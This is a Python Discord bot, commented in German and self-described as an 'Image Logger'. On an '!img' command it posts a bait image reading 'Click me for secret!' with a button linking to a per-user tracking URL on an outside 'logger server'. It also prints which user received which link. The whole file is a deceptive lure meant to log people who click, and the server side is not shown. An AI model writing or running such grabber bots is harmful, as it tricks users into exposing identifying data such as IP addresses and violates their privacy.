import discord
from discord.ext import commands
import aiohttp
import asyncio
import requests
from PIL import Image, ImageDraw, ImageFont
import io
import random
import string
from datetime import datetime

# KONFIG
WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
TRACKING_DOMAIN = "https://o2i8hf8h3h8h.tracker.example.com/"  # Dein Logger Server

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

def generate_random_image():
    """Generiert zufälliges Fake-Bild"""
    img = Image.new('RGB', (800, 600), color=random.choice([
        (random.randint(0,255), random.randint(0,255), random.randint(0,255))
    ]))
    draw = ImageDraw.Draw(img)
    
    # Fake Text
    try:
        font = ImageFont.truetype("arial.ttf", 40)
    except:
        font = ImageFont.load_default()
    
    draw.text((50, 250), "Click me for secret!", fill="white", font=font)
    return img

def generate_tracking_url(user_id):
    """Generiert unique Tracking Link"""
    return f"{TRACKING_DOMAIN}track/{user_id}/{''.join(random.choices(string.ascii_letters + string.digits, k=16))}"

@bot.event
async def on_ready():
    print(f"[+] {bot.user} logged in - Image Logger ready!")
    print(f"[+] Webhook: {WEBHOOK_URL[:30]}...")

@bot.command(name='img')
async def img_command(ctx):
    """!img Command - Sendet getracktes Bild"""
    user_id = str(ctx.author.id)
    tracking_url = generate_tracking_url(user_id)
    
    # Fake Bild generieren
    img = generate_random_image()
    img_buffer = io.BytesIO()
    img.save(img_buffer, format='PNG')
    img_buffer.seek(0)
    
    # Unsichtbarer Tracking Pixel im Bild
    embed = discord.Embed(
        title="🔥 Secret Image!",
        description="Click to reveal hidden content 👀",
        color=0xff0000
    )
    
    file = discord.File(img_buffer, filename="secret.png")
    embed.set_image(url="attachment://secret.png")
    
    # Tracking Link als Button
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="View Image", url=tracking_url, style=discord.ButtonStyle.link))
    
    await ctx.send(embed=embed, file=file, view=view)
    print(f"[+] Image sent to {ctx.author} (ID: {user_id}) -> {tracking_url}")

# Error Handling
@img_command.error
async def img_error(ctx, error):
    await ctx.send("❌ Error generating image!")

# Bot starten
bot.run(BOT_TOKEN)
